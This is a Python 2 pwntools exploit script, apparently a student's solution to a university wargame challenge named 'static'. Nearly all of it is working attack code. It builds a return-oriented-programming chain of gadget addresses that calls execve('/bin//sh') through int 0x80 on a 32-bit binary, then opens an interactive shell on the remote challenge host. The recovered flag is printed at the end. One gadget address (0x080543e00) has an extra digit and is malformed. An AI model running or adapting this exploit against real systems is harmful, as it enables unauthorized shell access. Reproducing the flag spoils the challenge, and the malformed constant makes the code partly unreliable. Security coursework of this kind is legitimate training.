#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./static --host wargames.6447.sec.edu.au --port 8004
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./static')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'wargames.6447.sec.edu.au'
port = int(args.PORT or 8004)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()
#run < <(python -c 'from pwn import *; print "A"*8+"B"*4+p32(0x8092330)+p32(0x804e700)+p32(0xffffdc9d)')
print io.recvuntil("...")
'''
1. zero out eax
2. acx points to null
3. edx points to null
4. ebx points to "/bin//sh"
5. eax is 0xb
6. int 0x80
'''
#0x080543e0: xor eax, eax; ret;
xor_eax=p32(0x080543e00)

dummy= p32(0x00000000)
#0x0805ca3d: mov edi, eax; mov esi, edx; mov eax, dword ptr [esp + 4]; ret;
mov_eax_to_edi=p32(0x0805ca3d)
#0x080e072c: add ebx, edi; add cl, byte ptr [edx]; ret;
add_edi_to_ebx=p32(0x080e072c)
#0x080481c9: pop ebx; ret;
pop_ebx=p32(0x080481c9)
#0x080bb236: pop eax; ret;
pop_eax=p32(0x080bb236)
#0x08065a74: mov eax, edx; ret;
mov_edx_to_eax=p32(0x08065a74)
#0x080e602d: xchg eax, ecx; or cl, byte ptr [esi]; adc al, 0x41; ret;
xchg_eax_ecx=p32(0x080e602d)
#0x0807b52f: inc eax; ret;
inc_eax=p32(0x0807b52f)
#0x0806f1a0: int 0x80; ret;
int_80=p32(0x0806f1a0)

buff  = "/bin//sh"
buff += dummy		#Has to be Zero
buff += mov_eax_to_edi
buff += pop_ebx
buff += dummy 		#Has to be ZERO
buff += add_edi_to_ebx
buff += pop_eax
buff += dummy
buff += mov_edx_to_eax
buff += xchg_eax_ecx
buff += pop_eax
buff += dummy
buff += inc_eax*11
buff += int_80
io.sendline(buff)
io.interactive()
#flag 6447{698fe9fd-1c5e-4992-b2c0-6df10e7e718a}

